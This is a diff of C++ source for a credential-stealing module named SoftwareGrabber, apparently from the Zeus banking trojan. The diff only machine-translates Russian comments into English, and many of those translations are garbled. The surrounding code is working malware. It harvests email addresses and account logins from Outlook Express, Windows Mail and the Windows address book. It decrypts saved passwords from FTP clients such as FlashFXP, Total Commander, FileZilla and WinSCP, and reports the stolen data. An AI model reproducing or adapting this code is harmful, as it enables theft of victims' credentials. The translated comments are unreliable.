@@ -57,7 +57,7 @@ static void writeReport(LPWSTR list, DWORD titleId, DWORD reportType)
   Mem::free(list);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void SoftwareGrabber::init(void)
 {
@@ -111,7 +111,7 @@ static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, ISt
 {
   HENUMSTORE enumStore;
   
-  //Ищим сообщения.
+  //Ischim message.
   if(currentFolder->GetFirstMessage(MSGPROPS_FAST, 0, MESSAGEID_FIRST, messageProps, &enumStore) == S_OK)
   {
     do
@@ -124,7 +124,7 @@ static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, ISt
         {
           for(ULONG i = 0; i < addressList.cAdrs; i++)
           {
-            //Добавляем адрес.
+            //Add the address.
             LPSTR email = addressList.prgAdr[i].pszEmail;
             if(email != NULL && Str::_findCharA(email, '@') != NULL)
             {
@@ -143,7 +143,7 @@ static void enumWindowsMailMessagesAndFolders(IMimeAllocator *mimeAllocator, ISt
     currentFolder->GetMessageClose(enumStore);
   }
 
-  //Ищим подиректории.
+  //Ischim podirektorii.
   if(currentFolder->GetFolderProps(0, folderProps) == S_OK && folderProps->cSubFolders > 0 && store->GetFirstSubFolder(folderProps->dwFolderId, folderProps, &enumStore) == S_OK)
   {
     IStoreFolder *subFolder;
@@ -166,7 +166,7 @@ void SoftwareGrabber::_emailWindowsMailRecipients(void)
   LPWSTR list = NULL;
   IStoreFolder *sendFolder;
   
-  //Получаем "Sent items".
+  //Obtain the "Sent items".
   if(store->Initialize(NULL, 0) == S_OK && store->OpenSpecialFolder(FOLDER_SENT, 0, &sendFolder) == S_OK)
   {
     IMimeAllocator *mimeAllocator = (IMimeAllocator *)ComLibrary::_createInterface(CLSID_IMimeAllocator, IID_IMimeAllocator);    
@@ -185,15 +185,15 @@ void SoftwareGrabber::_emailWindowsMailRecipients(void)
     sendFolder->Release();  
   }
   
-  //Выход.
+  //Exit.
   store->Release();
   
-  //Сохраянем лог.          
+  //Sohrayanem log.
   DWORD titleId = coreData.winVersion < OsEnv::VERSION_VISTA ? CryptedStrings::id_softwaregrabber_outlook_express_recips_title : CryptedStrings::id_softwaregrabber_windows_mail_recips_title;
   writeReport(list, titleId, BLT_GRABBED_EMAILSOFTWARE);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Надстройка над IPropertyContainer::GetPropSz() для получения Unicode-строки.
@@ -224,7 +224,7 @@ static LPWSTR outlookExpressSzToUnicode(IImnAccount *account, DWORD id)
 */
 static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, DWORD serverId, DWORD portId, DWORD sslId, DWORD userNameId, DWORD passwordId, LPWSTR *buffer)
 {
-  //Получаем.
+  //Obtain.
   LPWSTR server   = outlookExpressSzToUnicode(account, serverId);
   LPWSTR userName = outlookExpressSzToUnicode(account, userNameId);
   LPWSTR password = outlookExpressSzToUnicode(account, passwordId);
@@ -234,7 +234,7 @@ static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, D
   if(account->GetPropDw(portId, &port) != S_OK)port = 0;
   if(account->GetPropDw(sslId,  &ssl)  != S_OK)ssl  = 0;
 
-  //Добавляем.
+  //Add.
   {
     CSTR_GETW(format, softwaregrabber_account_server_info);
     CSTR_GETW(sslMarker, softwaregrabber_account_server_ssl);
@@ -249,7 +249,7 @@ static void appendOutlookExpressInfo(const LPWSTR title, IImnAccount *account, D
                        );
   }
 
-  //Освобождаем.
+  //Free.
   Mem::free(server);
   Mem::free(userName);
   Mem::free(password);
@@ -259,11 +259,11 @@ void SoftwareGrabber::_emailOutlookExpress(void)
 {
   HRESULT hr;
   
-  //Получаем IImnAccountManager.
+  //Obtain IImnAccountManager.
   IImnAccountManager *manager = (IImnAccountManager *)ComLibrary::_createInterface(CLSID_ImnAccountManager, IID_IImnAccountManager);
   if(manager == NULL)return;
 
-  //Инициализация.
+  //Initialization.
   IImnEnumAccounts *accounts;
   LPWSTR list = NULL;
 
@@ -275,7 +275,7 @@ void SoftwareGrabber::_emailOutlookExpress(void)
       DWORD serverTypes;
       if(account->GetServerTypes(&serverTypes) == S_OK && serverTypes != 0)
       {
-        //Заголовок аккаунта.
+        //Title of your account.
         {
           LPWSTR accountName = outlookExpressSzToUnicode(account, AP_ACCOUNT_NAME);
           LPWSTR email       = outlookExpressSzToUnicode(account, AP_SMTP_EMAIL_ADDRESS);
@@ -319,12 +319,12 @@ void SoftwareGrabber::_emailOutlookExpress(void)
   writeReport(list, CryptedStrings::id_softwaregrabber_outlook_express_title, BLT_GRABBED_EMAILSOFTWARE);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 typedef struct
 {
-  LPWSTR list;    //Строка для вывода аккаунтов.
-  DATA_BLOB salt; //Секрет паролей.
+  LPWSTR list;    //String to output accounts.
+  DATA_BLOB salt; //Secret passwords.
 }WINDOWSMAILDATA;
 
 /*
@@ -338,8 +338,8 @@ typedef struct
 */
 static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD stringId)
 {
-  WCHAR name[40]; //Размер на softwaregrabber_account_server_x_*.
-  WCHAR format[30]; //Размер на softwaregrabber_account_server_x_*.
+  WCHAR name[40]; //Size on softwaregrabber_account_server_x_ *.
+  WCHAR format[30]; //Size on softwaregrabber_account_server_x_ *.
 
   CryptedStrings::_getW(stringId, format);
   if(Str::_sprintfW(name, sizeof(name) / sizeof(WCHAR), format, title) > 0)return XmlParser::_getNodeTextOfElement(root, name);
@@ -360,14 +360,14 @@ static BSTR getWindowsMailString(IXMLDOMElement *root, const LPWSTR title, DWORD
 */
 static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const DATA_BLOB *salt, IXMLDOMElement *root, LPWSTR *buffer)
 {
-  //Получаем.
+  //Obtain.
   BSTR server   = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_server);
   BSTR port     = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_port);
   BSTR ssl      = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_ssl);
   BSTR userName = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_username);
   BSTR password = getWindowsMailString(root, title, CryptedStrings::id_softwaregrabber_account_server_x_password);
 
-  //Добавляем.
+  //Add.
   bool ok = (server != NULL);
   if(ok)
   {
@@ -375,7 +375,7 @@ static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const D
     DWORD sslDword      = ssl == NULL ? 0 : Str::_ToInt32W(ssl, NULL);
     LPWSTR passwordReal = NULL;
     
-    //Убейте меня за говнокод.
+    //Kill me for govnokod.
     if(port != NULL)
     {
       WCHAR portEx[12];
@@ -384,7 +384,7 @@ static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const D
       portDword = Str::_ToInt32W(portEx, NULL);
     }
 
-    //Получаем пароль.
+    //Obtain the password.
     int passwordLen = Str::_LengthW(password);
     if(password != NULL && passwordLen > 1 && (passwordLen % 2) == 0)
     {
@@ -403,7 +403,7 @@ static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const D
       }
     }
     
-    //Выводим.
+    //Conclusions.
     CSTR_GETW(format, softwaregrabber_account_server_info);
     CSTR_GETW(sslMarker, softwaregrabber_account_server_ssl);
 
@@ -418,7 +418,7 @@ static bool appendWindowsMailInfo(const LPWSTR title, DWORD defaultPort, const D
     Mem::free(passwordReal);
   }
 
-  //Освобождаем.
+  //Free.
   XmlParser::_freeBstr(server);
   XmlParser::_freeBstr(port);
   XmlParser::_freeBstr(ssl);
@@ -437,14 +437,14 @@ static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fi
   WINDOWSMAILDATA *wmd = (WINDOWSMAILDATA *)data;
   IXMLDOMDocument *doc;
 
-  //Открываем файл.
+  //Open the file.
   if(!Fs::_pathCombine(fileName, path, (LPWSTR)fileInfo->cFileName) || (doc = XmlParser::_openFile(fileName, NULL)) == NULL)return true;
 
-  //Пробираемся к списку акканутов.
+  //Wading to the list akkanutov.
   IXMLDOMElement *root;
   if(doc->get_documentElement(&root) == S_OK)
   {
-    //Проверяем имя рута.
+    //Check the name of the root.
     bool ok = false;
     {
       BSTR rootName;
@@ -456,12 +456,12 @@ static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fi
       }
     }
     
-    //Получаем аккауны.
+    //Obtain akkauny.
     if(ok)
     {        
       LPWSTR tmpList = NULL;
       
-      //Заголовок аккаунта.
+      //Title of your account.
       {
         BSTR accountName;
         BSTR email;
@@ -489,7 +489,7 @@ static bool windowsMailAccountProc(const LPWSTR path, const WIN32_FIND_DATAW *fi
         if(size <= 0)ok = false;
       }
 
-      //Данные.
+      //Data.
       if(ok)
       {
         BYTE appended = 0;
@@ -525,11 +525,11 @@ void SoftwareGrabber::_emailWindowsMail(bool live)
   WINDOWSMAILDATA wmd;
   WCHAR path[MAX_PATH];
   {
-    //Получаем ключ.
+    //Obtain the key.
     WCHAR regKey[max(CryptedStrings::len_softwaregrabber_windows_live_mail_regkey, CryptedStrings::len_softwaregrabber_windows_mail_regkey)];
     CryptedStrings::_getW(live ? CryptedStrings::id_softwaregrabber_windows_live_mail_regkey : CryptedStrings::id_softwaregrabber_windows_mail_regkey, regKey);
 
-    //Получаем директорию для поиска.
+    //Obtain a directory to search.
     {  
       CSTR_GETW(regValue, softwaregrabber_windows_mail_regvalue_path);
       DWORD r = Registry::_getValueAsString(HKEY_CURRENT_USER, regKey, regValue, path, MAX_PATH);
@@ -537,7 +537,7 @@ void SoftwareGrabber::_emailWindowsMail(bool live)
       WDEBUG1(WDDT_INFO, "path=[%s]", path);
     }
 
-    //Получаем секрет для пароля.
+    //Obtain the secret password.
     wmd.list = NULL;
     {
       CSTR_GETW(regValue, softwaregrabber_windows_mail_regvalue_salt);
@@ -545,20 +545,20 @@ void SoftwareGrabber::_emailWindowsMail(bool live)
     }
   }
 
-  //Ищим.
+  //Ischim.
   {
     CSTR_GETW(file1, softwaregrabber_windows_mail_file_1);
     LPWSTR files[] = {file1};
     Fs::_findFiles(path, files, sizeof(files) / sizeof(LPWSTR), Fs::FFFLAG_RECURSIVE | Fs::FFFLAG_SEARCH_FILES, windowsMailAccountProc, &wmd, NULL, 0, 0);
   }
 
-  //Сохраянем лог.          
+  //Sohrayanem log.
   writeReport(wmd.list, live ? CryptedStrings::id_softwaregrabber_windows_live_mail_title : CryptedStrings::id_softwaregrabber_windows_mail_title, BLT_GRABBED_EMAILSOFTWARE);
 }
 
 void SoftwareGrabber::_emailWindowsAddressBook(void)
 {
-  //Загружаем DLL.
+  //Load the DLL.
   HMODULE wabDll;
   {
     WCHAR dllPath[MAX_PATH];
@@ -578,7 +578,7 @@ void SoftwareGrabber::_emailWindowsAddressBook(void)
     }
   }
 
-  //Получаем интерфейс.
+  //Obtain the interface.
   IAddrBook *addressBook;
   IWABObject *wabObject;
   {
@@ -591,7 +591,7 @@ void SoftwareGrabber::_emailWindowsAddressBook(void)
     }
   }
 
-  //Собираем emails.
+  //Collect emails.
   ULONG entryId;
   ENTRYID *entryIdStruct;
   ULONG objectType;
@@ -615,7 +615,7 @@ void SoftwareGrabber::_emailWindowsAddressBook(void)
         
           if(table->GetRowCount(0, &rowsCount) == S_OK && table->QueryRows(rowsCount, 0, &rows) == S_OK)
           {
-            //Перечисляем.
+            //Enumerate.
             for(ULONG i = 0; i < rows->cRows; i++)
             {
               SRow *row = &rows->aRow[i];
@@ -643,7 +643,7 @@ void SoftwareGrabber::_emailWindowsAddressBook(void)
                     break;
                 
                   default:
-                    //WDEBUG1(WDDT_INFO, "props->ulPropTag=0x%08X", props->ulPropTag);
+                    //WDEBUG1 (WDDT_INFO, "props-> ulPropTag = 0x% 08X", props-> ulPropTag);
                     break;
                 }
                 if(ok)Str::_CatExW(&list, L"\n", 1);
@@ -666,11 +666,11 @@ void SoftwareGrabber::_emailWindowsAddressBook(void)
   else WDEBUG0(WDDT_ERROR, "Failed.");
 #endif  
   
-  //Выход.
+  //Exit.
   addressBook->Release();
   wabObject->Release();
 
-  //Сохраянем лог.
+  //Sohrayanem log.
   writeReport(list, CryptedStrings::id_softwaregrabber_wab_title, BLT_GRABBED_EMAILSOFTWARE);
 
 END:  
@@ -681,18 +681,18 @@ void SoftwareGrabber::_emailWindowsContacts(void)
 {
   HRESULT hr;
 
-  //Получаем IContactManager.
+  //Obtain IContactManager.
   IContactManager *manager = (IContactManager *)ComLibrary::_createInterface(CLSID_ContactManager, IID_IContactManager);
   if(manager == NULL)return;
 
-  //Инициализация.  
+  //Initialization.
   {
     CSTR_GETW(initName, softwaregrabber_wc_init_name);
     CSTR_GETW(initVersion, softwaregrabber_wc_init_version);
     hr = manager->Initialize(initName, initVersion);
   }
   
-  //Получаем все контакты.
+  //Get all the contacts.
   IContactCollection *collection;
   LPWSTR list = NULL;
 
@@ -705,12 +705,12 @@ void SoftwareGrabber::_emailWindowsContacts(void)
     IContact *contact;
     IContactProperties *props;
 
-    collection->Reset(); //Параноя.
+    collection->Reset(); //Paranoia.
     while(collection->Next() == S_OK)if(collection->GetCurrent(&contact) == S_OK)
     {
       if(contact->QueryInterface(IID_IContactProperties, (void **)&props) == S_OK)
       {
-        for(BYTE i = 1; i <= 100; i++) //Т.е. не более 100 мылов на конакт.
+        for(BYTE i = 1; i <= 100; i++) //Ie no more than 100 mylov on konakt.
         {
           if(Str::_sprintfW(propertyName, sizeof(propertyName) / sizeof(WCHAR), propertyFormat, i) <= 0)break;
           
@@ -723,7 +723,7 @@ void SoftwareGrabber::_emailWindowsContacts(void)
 
           if(hr == S_OK || hr == ERROR_INSUFFICIENT_BUFFER /*Буфер мал.*/ || hr == S_FALSE /*Параметр пустой*/)continue;
 
-          break; //Обычно ERROR_PATH_NOT_FOUND.
+          break; //Usually ERROR_PATH_NOT_FOUND.
         }
         props->Release();
       } 
@@ -750,26 +750,26 @@ void SoftwareGrabber::_emailAll(void)
 
   _emailWindowsMailRecipients();
   
-  //Windows Live Mail может быть установлен на XP+.
+  //Windows Live Mail can be installed on XP +.
   _emailWindowsMail(true);
 }
 #endif
 
 #if(BO_SOFTWARE_FTP > 0)
 
-//Максимальный размер элемента.
+//The maximum size of the item.
 #define MAX_ITEM_SIZE 0xFF
 
-//Данные для рекрусивного поиска по FTP-клиентам.
+//Data for rekrusivnogo Search FTP-clients.
 typedef struct
 {
-  LPWSTR list;  //Список найденых акков.
-  DWORD count;  //Кол. найденых акков.
+  LPWSTR list;  //List of found akkov.
+  DWORD count;  //Count. Found akkov.
 }FTPDATA;
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// FlashFXP
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In FlashFXP
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Декруптор пароля.
@@ -821,12 +821,10 @@ static int ftpFlashFxp3Decrypt(LPWSTR pass, LPWSTR sectionName)
 
 bool ftpFlashFxp3Proc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-*/
+В В IN path - the path.
+В В IN OUT ftpData - search data.*/
 static void ftpFlashFxp3BasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_flashfxp_file_1);
@@ -926,9 +924,9 @@ void SoftwareGrabber::_ftpFlashFxp3(void)
   else Mem::free(ftpData.list);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// CuteFTP
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In CuteFTP
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 #if(0)
 /*
   Декруптор пароля.
@@ -979,12 +977,10 @@ static int ftpCuteFtpDecrypt(LPWSTR pass, LPWSTR sectionName)
 
 bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-*/
+В В IN path - the path.
+В В IN OUT ftpData - search data.*/
 static void ftpCuteFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   const LPWSTR files[] = {L"sm.dat", L"tree.dat", L"smdata.dat"};
@@ -1008,7 +1004,7 @@ static bool ftpCuteFtpProc(LPWSTR path, WIN32_FIND_DATAW *fileInfo, void *data)
         LPBYTE data    = mf.pData;
         LPBYTE dataEnd = data + mf.dwSize;
         
-        //FIXME: Бинарные данные в неизвестном формате.
+        //FIXME: Binary data in an unknown format.
 
         Fs::_closeMemFile(&mf);
       }
@@ -1037,7 +1033,7 @@ void SoftwareGrabber::_ftpCuteFtp(void)
 
   if(ftpData.count > 0)
   {
-    //FIXME: writeReport(ftpData.list, CryptedStrings::id_softwaregrabber_flashfxp_title, BLT_GRABBED_FTPSOFTWARE);
+    //FIXME: writeReport (ftpData.list, CryptedStrings:: id_softwaregrabber_flashfxp_title, BLT_GRABBED_FTPSOFTWARE);
     WDEBUG1(WDDT_INFO, "CuteFTP:\n%s", ftpData.list);
     Report::writeString(BLT_GRABBED_FTPSOFTWARE, L"CuteFTP", NULL, ftpData.list);
   }
@@ -1046,9 +1042,9 @@ void SoftwareGrabber::_ftpCuteFtp(void)
 }
 #endif
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Total Commander
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In Total Commander
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 static unsigned long randTotalCommander(unsigned long *seed, unsigned long val)
 {
@@ -1106,12 +1102,10 @@ static int ftpTotalCommanderDecrypt(LPWSTR pass)
 
 bool ftpTotalCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-  IN recrusive   - рекрусивный поиск.
+В В IN path - the path.
+В В IN OUT ftpData - search data.  IN recrusive   - рекрусивный поиск.
 */
 static void ftpTotalCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData, bool recrusive)
 {
@@ -1230,9 +1224,9 @@ void SoftwareGrabber::_ftpTotalCommander(void)
   else Mem::free(ftpData.list);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// WS_FTP
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In WS_FTP
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Декруптор пароля.
@@ -1243,18 +1237,16 @@ void SoftwareGrabber::_ftpTotalCommander(void)
 */
 static int ftpWsFtpDecrypt(LPWSTR pass)
 {
-  //FIXME: Узнать алгоритм.
+  //FIXME: Find out the algorithm.
   return Str::_LengthW(pass);
 }
 
 bool ftpWsFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-  IN recrusive   - рекрусивный поиск.
+В В IN path - the path.
+В В IN OUT ftpData - search data.  IN recrusive   - рекрусивный поиск.
 */
 static void ftpWsFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
@@ -1354,18 +1346,16 @@ void SoftwareGrabber::_ftpWsFtp(void)
   else Mem::free(ftpData.list);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// FileZilla
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In FileZilla
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 bool ftpFileZillaProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-*/
+В В IN path - the path.
+В В IN OUT ftpData - search data.*/
 static void ftpFileZillaBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_filezilla_file_mask_1);
@@ -1462,9 +1452,9 @@ void SoftwareGrabber::_ftpFileZilla(void)
   else Mem::free(ftpData.list);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// FAR Manager
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In FAR Manager
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Декруптор пароля.
@@ -1545,9 +1535,9 @@ void SoftwareGrabber::_ftpFarManager(void)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// WinSCP
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In WinSCP
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Декруптор пароля.
@@ -1658,14 +1648,14 @@ void SoftwareGrabber::_ftpWinScp(void)
 }
 
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// FTP Commander
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In FTP Commander
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void ftpFtpCommanderMarkStringEnd(LPSTR string)
 {
   LPSTR end = Str::_findCharA(string, ';');
-  //Т.к. автор клиента идиот, это более менее сохранит данные верными.
+  //Because author idiot customer, it's more or less keep the data accurate.
   if(end != NULL)
   {
     while(end[1] == ';')end++; 
@@ -1682,7 +1672,7 @@ void ftpFtpCommanderMarkStringEnd(LPSTR string)
 */
 static int ftpFtpCommanderDecrypt(LPSTR pass)
 {
-  //Автор клиента идиот.
+  //Author customer an idiot.
   if((pass[0] == '0' || pass[0] == '1') && pass[1] == 0)return 0;
   
   int i = 0;
@@ -1692,12 +1682,10 @@ static int ftpFtpCommanderDecrypt(LPSTR pass)
 
 bool ftpFtpCommanderProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-*/
+В В IN path - the path.
+В В IN OUT ftpData - search data.*/
 static void ftpFtpCommanderBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_fc_file_1);
@@ -1796,9 +1784,9 @@ void SoftwareGrabber::_ftpFtpCommander(void)
   else Mem::free(ftpData.list);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// CoreFTP
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In CoreFTP
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Декруптор пароля.
@@ -1809,7 +1797,7 @@ void SoftwareGrabber::_ftpFtpCommander(void)
 */
 static int ftpCoreFtpDecrypt(LPWSTR pass)
 {
-  //FIXME:AES
+  //FIXME: AES
   return Str::_LengthW(pass);
 }
 
@@ -1872,9 +1860,9 @@ void SoftwareGrabber::_ftpCoreFtp(void)
   }
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// SmartFTP
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//In SmartFTP
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Декруптор пароля.
@@ -1911,12 +1899,10 @@ static int ftpSmartFtpDecrypt(LPWSTR pass)
 
 bool ftpSmartFtpProc(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
 
-/*
-  Стандартный поиск.
+/*В В Standard search.
 
-  IN path        - путь.
-  IN OUT ftpData - данные поиска.
-*/
+В В IN path - the path.
+В В IN OUT ftpData - search data.*/
 static void ftpSmartFtpBasicSearch(LPWSTR path, FTPDATA *ftpData)
 {
   CSTR_GETW(file1, softwaregrabber_smartftp_file_mask_1);
@@ -2032,7 +2018,7 @@ void SoftwareGrabber::_ftpSmartFtp(void)
 void SoftwareGrabber::_ftpAll(void)
 {
   _ftpFlashFxp3();
-  //_ftpCuteFtp();
+  //_ftpCuteFtp ();
   _ftpTotalCommander();
   _ftpWsFtp();
   _ftpFileZilla();
